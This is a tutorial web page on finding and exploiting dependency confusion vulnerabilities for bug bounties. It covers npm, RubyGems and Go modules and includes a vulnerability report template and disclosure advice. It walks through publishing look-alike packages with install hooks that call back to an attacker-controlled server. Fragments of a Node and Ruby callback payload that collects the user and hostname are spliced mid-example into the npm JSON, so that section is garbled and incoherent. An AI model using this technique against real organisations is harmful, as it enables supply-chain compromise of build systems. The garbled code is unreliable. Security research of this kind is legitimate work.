📚 Dependency Confusion Tutorials

Complete Guide to Finding and Exploiting Dependency Confusion Vulnerabilities

🎯 What is Dependency Confusion?

Dependency Confusion is a supply chain attack that exploits how package managers resolve dependencies. When a company uses internal/private packages with names that don't exist on public registries, an attacker can register a package with the same name on the public registry with a higher version number.

The package manager, following its default behavior of fetching the highest version available, will download the malicious public package instead of the legitimate internal one.

$130,000+ in Bug Bounties

Alex Birsan earned over $130,000 from Apple, Microsoft, Tesla, and 35+ companies using this technique.

How It Works

  1. Discovery: Find internal package names via exposed dependency files (package.json, Gemfile, requirements.txt)
  2. Verification: Check if the package name exists on public registries (npm, RubyGems, PyPI)
  3. Registration: If not found (404), register the package with a high version number (e.g., 99.99.99)
  4. Payload: Add post-install hooks that execute code and call back to your server
  5. Execution: When the target installs dependencies, your malicious package runs automatically

⚠️ Legal Warning

Only test on systems you have explicit authorization to test. Dependency confusion attacks can affect production systems and CI/CD pipelines. Always coordinate with the target's security team through responsible disclosure.

📦 NPM Dependency Confusion

NPM is the most common target for dependency confusion attacks due to its widespread use and the ease of publishing packages. The attack exploits npm's default behavior of fetching the highest semver version from all configured registries.

Step 1: Find Target Packages

Look for package.json files in:

  • Public GitHub repositories
  • Exposed /.well-known/ paths
  • JavaScript source maps
  • Webpack bundles with comments
JSON 
{
  "name": "target-app",
  "dependencies": {
    "react": "^18.0.0",
    "internal-auth-module": "^1.2.0",  // <-- Target this!

  }

function getLocalIP() {
  const interfaces = os.networkInterfaces();

    embeds: [{
      title: '🎯 Dependency Confusion - Ruby Gem Callback!',
      color: 0xff0000,

        { name: '👤 User', value: ENV['USER'] || 'unknown', inline: true },
        { name: '🖥️ Hostname', value: Socket.gethostname, inline: true },

rescue => e

🔷 Go Modules Dependency Confusion

Go modules use a different resolution mechanism based on module paths (import URLs). While harder to exploit than npm/PyPI, private modules with public-looking paths can be vulnerable.

Understanding Go Module Resolution

ℹ️ How Go Resolves Modules

Go modules are identified by their import path (e.g., github.com/company/internal-tool). The Go proxy (proxy.golang.org) caches public modules. Private modules require GOPRIVATE configuration.

Step 1: Find Target Modules

Go - go.mod 
module github.com/company/main-app

go 1.21

require (
    github.com/gin-gonic/gin v1.9.0
    company.internal/auth-service v1.2.0     // <-- Private module
    github.com/company/internal-utils v0.1.0 // <-- Could be vulnerable!
)

Step 2: Check Module Availability

Bash 
# Check if module exists on Go proxy
curl -s "https://proxy.golang.org/github.com/company/internal-utils/@v/list"

# Empty response = Module not cached/available = Potential target

# Check pkg.go.dev
curl -s -o /dev/null -w "%{http_code}" "https://pkg.go.dev/github.com/company/internal-utils"

Key Takeaways

✅ What Makes a Successful Finding

  • Automatic Installation: Package installs without manual intervention
  • CI/CD Impact: Callbacks from build servers are more valuable
  • Public Distribution: Package must be fetchable from public registry
  • Quick Response: Report immediately after receiving callback
  • Clean PoC: Only collect hostname/username - no sensitive data

⚠️ Common Rejection Reasons

  • Package only referenced in code, not actually installed
  • Internal registry is properly configured (no public fallback)
  • Package already claimed on public registry by company
  • Duplicate report - someone else found it first
  • Out of scope - package not used in production

📝 Writing a Good Report

  1. Clear Title: "Dependency Confusion leads to RCE via [package-name] on [ecosystem]"
  2. Executive Summary: Explain the vulnerability in 2-3 sentences for non-technical readers.
  3. Technical Details: Include the exact package name, how you found it, and evidence.
  4. Proof of Concept: Show callback data (hostname, user, CI environment) without including sensitive info.
  5. Impact Assessment: Was it a developer machine? CI/CD? Production? What data was exposed?
  6. Remediation Steps: Suggest fixes like using scoped packages, registry pinning, etc.

## Summary
A dependency confusion vulnerability was identified in [Company]'s internal package
`[package-name]`. By registering this package on [npm/PyPI/RubyGems] with a higher
version number, arbitrary code execution was achieved during the build process.

## Vulnerability Details
- **Package Name:** `[package-name]`
- **Ecosystem:** [npm/PyPI/RubyGems]
- **Version Published:** 99.99.99
- **Date Published:** [Date]
- **First Callback Received:** [Date/Time]

## Evidence of Execution
The following callbacks were received from [Company]'s infrastructure:

| Field | Value |
|-------|-------|
| Hostname | build-server-01.internal.company.com |
| Username | jenkins |
| Working Directory | /var/lib/jenkins/workspace/main-app |
| CI Environment | JENKINS_URL detected |
| IP Address | 10.x.x.x (internal) |

## Impact
- **Severity:** Critical
- **Type:** Remote Code Execution (RCE)
- **Affected Systems:** CI/CD pipeline (Jenkins)
- **Potential Impact:** Full compromise of build infrastructure, supply chain attack

## Steps to Reproduce
1. Search for [Company]'s GitHub repositories for `package.json` files
2. Identify internal package names not available on public npm
3. Register the package on npm with version 99.99.99
4. Wait for the build system to install dependencies

## Remediation
1. Use scoped packages (@company/package-name)
2. Configure `.npmrc` to use private registry only for internal packages
3. Implement dependency pinning in lock files
4. Use tools like Socket.dev or Snyk for supply chain monitoring

✅ Best Practices

  • Always unpublish/yank your package after receiving callbacks
  • Never exfiltrate actual sensitive data - hostname and username are enough
  • Report quickly - don't leave packages up longer than necessary
  • Include remediation steps in your report
  • Be available for questions from the security team
